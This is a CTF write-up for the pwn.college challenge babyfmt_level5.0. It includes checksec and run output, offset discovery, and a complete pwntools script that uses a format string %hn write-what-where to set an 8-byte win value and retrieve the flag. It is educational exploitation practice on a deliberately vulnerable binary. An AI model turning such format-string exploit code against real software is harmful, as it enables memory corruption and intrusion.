---
title: "Write-What-Where - 8 bytes"
description: ""
author: "İsmail BOZKURT"
date: 2025-08-19
tags:
  - binary-exploitation
  - format-string-attack
  - pwn
  - CTF
categories:
  - Exploitation
  - Pwn
  - Format-String-Attack
---

## Format String Attack - Write-What-Where - 8 bytes

This variant includes 8 bytes **write-what-where**

Steps same as before. nothing to mentioned specially here.

### babyfmt_level5.0

```css
root@56972fd7d79f:/host# checksec babyfmt_level5.0 
[*] '/host/babyfmt_level5.0'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

When run the binary without doing anything special.

```perl
root@56972fd7d79f:/host# ./babyfmt_level5.0 
###
### Welcome to ./babyfmt_level5.0!
###

This challenge reads in some bytes, calls printf on that string, and allows you to perform
a format string attack. Through this series of challenges, you will become painfully familiar
with the concept of Format String Attacks!

This challenge allows you to make a 256-sized format string.

This challenge requires you to set a win value, located in the .bss, to 0x82802f819c27a46a. If you successfully
pull that off, the challenge will give you the flag! You will need to use %n to set this value
Moreover, since the win value is so large, you will need to use several %hn writes rather than an %ln.

The win value in the .bss is located at 0x4040f8! Remember to write this in little endian in your format string.
Remember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.

I will now read up to 256 bytes. Send your data!
asd
Received 4 bytes!

I will now call printf on your data!

asd

And now, let's check the win value!
Checking win value...
... desired win value: 0x82802f819c27a46a
... written win value: 0
... INCORRECT!
### Goodbye!
```

#### The offset and padlen values

Previous script will constantly using the get these values. 

```perl
[DEBUG] Received 0x102 bytes:
    b'Received 33 bytes!\n'
    b'\n'
    b'I will now call printf on your data!\n'
    b'\n'
    b'aaaabaaacaaadaaaeaaaSTART0x6161616261616161END\n'
    b"And now, let's check the win value!\n"
    b'Checking win value...\n'
    b'... desired win value: 0x82802f819c27a46a\n'
    b'... written win value: 0\n'
    b'... INCORRECT!\n'
    b'### Goodbye!\n'
[*] Found format string offset: 38
[+] User input starts at  : 38
[+] Needed pads           :0
[+] Numbwritten           :0
```

#### get_flag.py

Nothing fancy here. FmtStr class make life really easier. Excellent library pwntools <3.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './babyfmt_level5.0')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *func+467
continue
'''.format(**locals())

# -- Exploit goes here --

def get_win_address_and_value(text):
    match = re.findall(rb"0x[0-9a-fA-F]+", text)
    if match:
        return match
    return None

def send_fmt(payload):
    io.sendafter(b'Send your data!\n', payload)


io = start()

#### get win_value and win_address ####
leaks = get_win_address_and_value(io.recvuntil(b'offset.'))
desired_val = int(leaks[0], 16)
win_addr    = int(leaks[1], 16)

info(f'Desired Value: {desired_val:#x}')
info(f'Win Address  : {win_addr:#x}')

#### write win_value at win_address ####
offset = 38
padlen = 0

f = FmtStr(send_fmt, offset=38, padlen=0, numbwritten=padlen)
f.write(win_addr, desired_val)
f.execute_writes()


success(io.recv())

io.interactive()
```

**The result:**

```perl
And now, let's check the win value!
Checking win value...
... desired win value: 0x82802f819c27a46a
... written win value: 0x82802f819c27a46a
... SUCCESS! Here is your flag:
pwn.college{skd**************************EzW}
### Goodbye!
```

## References 

- **glibc Manual – Formatted Output**  
    [https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html](https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html)

- **man 3 printf** (POSIX specifiers, positional args, `%n`)  
    [https://man7.org/linux/man-pages/man3/printf.3.html](https://man7.org/linux/man-pages/man3/printf.3.html)

- **CERT C – FIO30-C: Exclude user input from format strings**  
    [https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings](https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings)

- **MITRE CWE-134 – Externally-Controlled Format String**  
    [https://cwe.mitre.org/data/definitions/134.html](https://cwe.mitre.org/data/definitions/134.html)

- **Pwntools Documentation – Format String Exploits**  
    [https://docs.pwntools.com/en/stable/fmtstr.html](https://docs.pwntools.com/en/stable/fmtstr.html)

- **Pwntools Source – `fmtstr_payload` Implementation**  
    [https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027)

- **Exploit Education – Format String Vulnerabilities**  
    [https://exploit.education/phoenix/format-string/](https://exploit.education/phoenix/format-string/)

- **CTF 101 – Format String Vulnerability**  
    [https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

- **pwn.college – Format String Exploits**  
    [https://pwn.college/software-exploitation/format-string-exploits](https://pwn.college/software-exploitation/format-string-exploits)

- **Classic Paper – Exploiting Format String Vulnerabilities (scut/Team TESO)**  
    [https://cs155.stanford.edu/papers/formatstring-1.2.pdf](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

- **OWASP – Format String Attack**  
    [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack)

- **LiveOverflow CTF Video – Format String Basics**  
    [https://www.youtube.com/watch?v=0WvrSfcdq1I](https://www.youtube.com/watch?v=0WvrSfcdq1I)
